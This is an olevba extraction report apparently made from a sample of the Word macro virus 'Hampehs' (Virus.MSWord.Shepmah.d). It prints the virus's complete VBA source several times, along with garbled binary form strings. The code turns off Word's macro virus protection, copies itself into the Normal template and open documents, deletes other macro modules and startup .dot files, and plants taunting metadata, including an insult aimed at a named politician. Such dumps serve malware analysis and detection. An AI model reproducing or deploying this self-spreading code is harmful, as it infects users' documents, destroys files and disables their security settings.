olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shepmah.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shepmah.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hampehs.bas 
in file: Virus.MSWord.Shepmah.d - OLE stream: 'Macros/VBA/hampehs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hampesh v1.0b
'Release : 12/10/1999

'Dedicated to the biggest PUKIMAK in Malaysia!
'Dato' Seri Dr Mahathir Mohamed

Public Ushar_SB As Variant
Public Dah_Jumpe, Check As Boolean
Public actDoc, SloSlo As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next

coprasmi = "hampehs"

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = True
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        Check = False
        ddDest = actDoc.FullName
        usharAct = actDoc
        Set SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            Check = False
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            Set SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
            Ushar_Awek = actDoc.VBProject.VBComponents.Item(3).Name
            
            If Ushar_SB = "hampehs" And Ushar_Awek = "DingDang" Then GoTo pusin
                
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            orait = True
    
pusin:
coprasmi = "DingDang"
Next chett

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "DingDang Yang Kiyut"
    .Title = "Hampehs! What The Hell Is It?"
    .Subject = "It is other method saying SHIT!"
    .Comments = "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
    .Keywords = "I Love Shida!!"
    .Execute
End With

If orait = True Then SloSlo.SaveAs FileName:=SloSlo.FullName
End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Or Ushar_SB = "" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = False Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"

End Sub
Sub AutoExec()
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled

Kill Application.StartupPath & "\*.dot"

Set actDoc = ActiveDocument

Go_DingDang

If Documents.Count > 1 Then
    Dim bil
    For bil = 1 To Documents.Count
        If Documents(bil).Name <> ActiveDocument.Name Then
        Set actDoc = Documents(bil)
        Dah_Jumpe = True
        Go_DingDang
        End If
    Next
End If


End Sub
Sub FileOpen()
WordBasic.disableautomacros True
If Dialogs(80).Show <> 0 Then WordBasic.disableautomacros False
AutoOpen
WordBasic.disableautomacros False
End Sub
Sub ViewVBCode()
On Error Resume Next
End Sub







-------------------------------------------------------------------------------
VBA MACRO DingDang.frm 
in file: Virus.MSWord.Shepmah.d - OLE stream: 'Macros/VBA/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 























r Mahathir Mohamed

Public Ushar_SB As Variant
Public Dah_Jumpe, Check As Boolean
Public actDoc, SloSlo As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next

coprasmi = "hampehs"

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = True
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        Check = False
        ddDest = actDoc.FullName
        usharAct = actDoc
        Set SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            Check = False
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            Set SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
            Ushar_Awek = actDoc.VBProject.VBComponents.Item(3).Name
            
            If Ushar_SB = "hampehs" And Ushar_Awek = "DingDang" Then GoTo pusin
                
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            orait = True
    
pusin:
coprasmi = "DingDang"
Next chett

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "DingDang Yang Kiyut"
    .Title = "Hampehs! What The Hell Is It?"
    .Subject = "It is other method saying SHIT!"
    .Comments = "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
    .Keywords = "I Love Shida!!"
    .Execute
End With

If orait = True Then SloSlo.SaveAs FileName:=SloSlo.FullName
End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Or Ushar_SB = "" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = False Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"

End Sub
Sub AutoExec()
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCan _


øBas|0{0 _
 _
 _
 _
-

 _








 _







 _
 _
 _
 _
 _
 _
 _
 _
 _
 _
 _
0 _
hampehs
 _
ÿÿÿÿ _
ÿÿ
 _
 _
 _
ÿÿÿÿÿÿÿÿ _
 _
 _
ÿÿ _
 _
 _

 _
 _
 _
iƒþÿÿÿÿÿÿÿÿÿ
ÿÿ _

r Mahathir Mohamed

Public Ushar_SB As Variant
Public Dah_Jumpe, Check As Boolean
Public actDoc, SloSlo As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next

coprasmi = "hampehs"

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = True
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        Check = False
        ddDest = actDoc.FullName
        usharAct = actDoc
        Set SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            Check = False
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            Set SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
            Ushar_Awek = actDoc.VBProject.VBComponents.Item(3).Name
            
            If Ushar_SB = "hampehs" And Ushar_Awek = "DingDang" Then GoTo pusin
                
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            orait = True
    
pusin:
coprasmi = "DingDang"
Next chett

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "DingDang Yang Kiyut"
    .Title = "Hampehs! What The Hell Is It?"
    .Subject = "It is other method saying SHIT!"
    .Comments = "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
    .Keywords = "I Love Shida!!"
    .Execute
End With

If orait = True Then SloSlo.SaveAs FileName:=SloSlo.FullName
End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Or Ushar_SB = "" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = False Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"

End Sub
Sub AutoExec()
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCan _
































































































































































 _
 _
 _
 _

 _








 _




















 _
 _
ÿÿ


 _
 _
 _
 _
 _
 _
 _
 _
 _

¯
 _
ÿÿÿÿ _
ÿÿÿÿÿÿÿÿ
 _
 _
ÿÿ _
ÿÿÿÿÿ
 _
 _
 _
ÿÿÿÿÿÿÿ _
 _
 _
ÿ _
 _
h„ÿÿÿÿÿÿÿÿ
 _
$ð _

r Mahathir Mohamed

Public Ushar_SB As Variant
Public Dah_Jumpe, Check As Boolean
Public actDoc, SloSlo As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next

coprasmi = "hampehs"

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = True
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        Check = False
        ddDest = actDoc.FullName
        usharAct = actDoc
        Set SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            Check = False
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            Set SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
            Ushar_Awek = actDoc.VBProject.VBComponents.Item(3).Name
            
            If Ushar_SB = "hampehs" And Ushar_Awek = "DingDang" Then GoTo pusin
                
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            orait = True
    
pusin:
coprasmi = "DingDang"
Next chett

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "DingDang Yang Kiyut"
    .Title = "Hampehs! What The Hell Is It?"
    .Subject = "It is other method saying SHIT!"
    .Comments = "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
    .Keywords = "I Love Shida!!"
    .Execute
End With

If orait = True Then SloSlo.SaveAs FileName:=SloSlo.FullName
End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Or Ushar_SB = "" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = False Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"

End Sub
Sub AutoExec()
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCan _













































































































































































































































































































































 _
 _
 _
e VB_Customizable = True _

 _








 _




















 _
 _
ÿÿ













 _
 _
ÿÿ _
ÿÿ _
ÿÿ _
ÿÿ _
 _
 _
- _

 _
ÿÿÿÿ _
ÿÿÿÿÿÿÿÿ
 _
 _
ÿÿ _
ÿÿÿÿÿ
 _
 _
 _
ÿÿÿÿÿÿÿ _
 _
 _
ÿ _
 _
h„ÿÿÿÿÿÿÿÿ
 _
$ð _

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������罽޵����ޭ����Ɣ�筭������Δ����ޜ�������֔�便���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���甔���ބ��kk9!!����{{���J))�{{���Z11�kk{BB�ss�{{����cc�ZZ�ss���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!!�RRs99!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kk�ss�{{�JJ�BB{99k11Z))�RR�ssJ!!�BB�JJ�kk�ZZ�99�kk�cc�BB�kkc))�RR�99R!!{11�RR�JJ)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cck))�BB�ZZ�11�JJB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z!!�BB�JJ�ZZ�BB�99�JJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c!!{))�BB�99�RR1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JJ�RR�99�JJk!!�BB�99�11�BBR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JJ�BB�11�))�99�BB�11Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{!!�99�BB�))�BB�99�))�11�99!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�99�!!�))�11k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!�))�99�11J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�))�11�!!�11)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�11�!!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�))�!!�))�!!�))1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!�))�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!�!!{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H���o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<{��j�[�����k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݺu�ā
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͛͢
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y{�$��4r�H�"'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-^����Ǐ��{�޵kǮ�Ku��iM����uU�Nm�,<z�ڭ�z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۈ>B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�-��.+��ӡ;gn�ہ�Z��	�۸Ð
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``��$L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��p��y��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?w.#tg��<y�ཫ����y�s���.�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Z��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j��Z?mg�1�q�޹��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���b��{��ߔ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��׎�M�	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�[5e���sIn�7j�蓏;�XW�h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<��#�;�ل�	04��;��BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�X��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H A�Ă�>�lf�:�Գ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�5���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N%����:�,4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�(U�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=��3�Np�(�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�H��AἔN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pJ6��#O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�=��ӥC���?[&��lE���4��W�;�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dB�#)AJ$`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��COr�45O;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HP4EjF�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z㯾m��;�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~�`�%;���N��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>���V?�Ѓ���M;�؃
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�D3�l�#A�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�8	O����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZO[�ܣ0?��#�w�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'q�o?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&>[��>�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��Î96�S�����[��c�>ݲ��8ؤ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�h��h����Z3�#�<i}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P!����VŸ�q<?�$M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��);��&A�`I�=H�ĕ:Z+���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�av�ZO*�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-X�=�ŭN�
}S
-------------------------------------------------------------------------------
